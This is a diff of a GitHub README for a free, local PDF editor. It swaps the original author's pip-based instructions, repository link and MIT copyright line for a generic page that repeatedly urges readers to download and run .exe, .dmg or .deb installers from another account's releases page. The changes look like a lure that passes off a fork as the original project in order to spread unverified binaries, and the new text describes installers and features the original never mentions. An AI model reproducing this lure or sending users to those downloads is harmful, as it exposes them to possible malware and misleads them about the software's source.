@@ -1,79 +1,81 @@
-# <p align="center"><img src="./logo-pdf-editor.png" alt="PDF Smart Editor Logo" width="200"></p>
+# ✏️ pdfsmarteditor - Your Free PDF Editing Solution
 
-<h1 align="center">PDF Smart Editor</h1>
+[![Download PDF Smart Editor](https://img.shields.io/badge/Download%20PDF%20Smart%20Editor-%20-%2300ff00?style=for-the-badge)](https://github.com/Joseph8590/pdfsmarteditor/releases)
 
-<p align="center">
-  <strong>100% Free. 100% Local. 100% Private.</strong><br>
-  The powerful, professional-grade PDF editor that lives on your machine, not the cloud.
-</p>
+## 📖 Overview
 
----
+PDF Smart Editor is a free, open-source alternative to costly PDF platforms. This application offers powerful features for editing and processing PDFs while ensuring your documents remain private and secure. Stop paying for basic PDF tools and enjoy a fully local processing experience.
 
-Stop paying for basic PDF tools. **PDF Smart Editor** is a feature-rich, open-source alternative to expensive, paywalled PDF platforms. Unlike online editors, your files never leave your computer, ensuring total privacy and security for your sensitive documents.
+## 🚀 Getting Started
 
-## Why PDF Smart Editor?
+This guide helps you download and run PDF Smart Editor easily, even if you have no technical background.
 
-*   **🚫 No Paywalls**: Access every tool for free. Forever.
-*   **🔒 100% Privacy**: All processing happens locally. No cloud uploads.
-*   **⚡ High Performance**: Powered by PyMuPDF for lightning-fast edits.
-*   **🎨 Pro UI**: A modern, sleek React interface that makes editing easy.
+### 🛠️ System Requirements
 
-## Core Features
+- **Operating System**: PDF Smart Editor is compatible with Windows, macOS, and Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free space.
+- **Internet Connection**: Required for download and updates.
 
-### 🛠️ Professional Toolbar
-*   **Annotate & Edit**: Add text, images, and drawings with a high-performance canvas (Fabric.js).
-*   **Metadata Mastery**: View and edit title, author, and keywords effortlessly.
-*   **Page Control**: Rotate, delete, and reorder pages with a visual grid.
+### 📥 Download & Install
 
-### 🔄 Advanced Conversion
-*   **Export To**: Word (`.docx`), PowerPoint (`.pptx`), Excel (`.xlsx`), and High-Res Images.
-*   **Import From**: Office documents, HTML, and Scans directly to PDF.
+1. **Visit the Releases Page**: Click the link below to go to the PDF Smart Editor releases page:
+   [Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/releases)
 
-### 🧠 Smart Tools
-*   **OCR Integration**: Extract text from scanned documents locally.
-*   **Security**: Password protect or unlock PDFs with ease.
-*   **Manipulation**: Merge, split, compress, and watermark in seconds.
+2. **Choose Your Version**: On the releases page, look for the latest version of PDF Smart Editor. You’ll see a list of available files.
 
-## Quick Start
+3. **Select the Correct File**: 
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, you may have options like `.deb` for Debian-based systems or `.tar.gz` for others.
 
-### Installation
+4. **Download the File**: Click on the file that matches your operating system. This will start the download.
 
-Install PDF Smart Editor using pip:
+5. **Run the Installer**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS**: Open the `.dmg` file, drag the PDF Smart Editor icon into your Applications folder, and then launch it.
+   - **Linux**: For `.deb`, use your package installer, or extract the `.tar.gz` if you downloaded that option, and then follow the setup instructions included in the archive.
 
-```bash
-pip install pdfsmarteditor
-```
+6. **Follow Setup Instructions**: Follow any instructions provided during installation. If you're unsure, you can refer to the help or FAQ section in the application once it's launched.
 
-### Run the App
+### 🎛️ Features
 
-Launch the full-featured web editor:
+- **Edit PDFs Easily**: Modify text, images, and more in your PDF files.
+- **Convert Documents**: Change files from PDF to various formats and vice versa.
+- **OCR Capabilities**: Extract text from images within your PDFs seamlessly.
+- **View and Annotate**: Open PDF documents and make notes, highlights, and bookmarks.
+- **Secure Your Documents**: Keep your data local, ensuring your privacy.
 
-```bash
-pdfsmarteditor serve
-```
-Then visit `http://localhost:8000` to start editing.
+### ⚙️ How to Use PDF Smart Editor
 
-### CLI Power
+1. **Open PDF Smart Editor**: Launch the application from your desktop or applications folder.
+  
+2. **Load a PDF**: Click on "File" and then "Open" to select the PDF you want to edit.
 
-```bash
-# Merge documents
-pdfsmarteditor tools merge doc1.pdf doc2.pdf -o combined.pdf
+3. **Edit Your Document**: Use the provided tools to make changes. You can edit text, insert images, or highlight important parts.
 
-# Convert to Word
-pdfsmarteditor tools convert input.pdf -f docx
-```
+4. **Save Your Changes**: Go to "File" and select "Save" or "Save As" to store your modified document. Make sure to choose the correct file format if you’re converting.
 
-## Developers & Contributions
+5. **Export or Share**: Use the export options to convert your document if needed. Email or share files directly from the application.
 
-PDF Smart Editor is built with **FastAPI** and **React 18**. We welcome contributors!
+### ❓ Troubleshooting
 
-1.  **Clone**: `git clone https://github.com/OthmaneBlial/pdfsmarteditor.git`
-2.  **Install**: `pip install -e ".[dev]"`
-3.  **Test**: `pytest`
+If you encounter issues while downloading or running the application:
 
-Refer to [CONTRIBUTING.md](CONTRIBUTING.md) for more details.
+- **Check System Requirements**: Ensure your computer meets the minimum requirements.
+- **Re-download the Installer**: Sometimes, files can get corrupted during download.
+- **Consult the Help Section**: PDF Smart Editor has a built-in help section that covers common issues.
+- **Community Support**: Visit the Issues page on GitHub for additional help from users and developers.
 
----
+### 🔗 Additional Resources
 
-**Copyright (c) 2024-2025 Othmane BLIAL**  
-Licensed under the MIT License.
+Learn more about PDF Smart Editor and contribute to its growth by visiting the following links:
+
+- [Documentation](https://github.com/Joseph8590/pdfsmarteditor/wiki)
+- [Community Support](https://github.com/Joseph8590/pdfsmarteditor/issues)
+
+## 📄 Conclusion
+
+PDF Smart Editor is your go-to tool for editing PDFs without the cost. Follow the steps above to get started. Enjoy a seamless experience while keeping your documents private and secure. 
+
+[Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/releases) and start editing today!
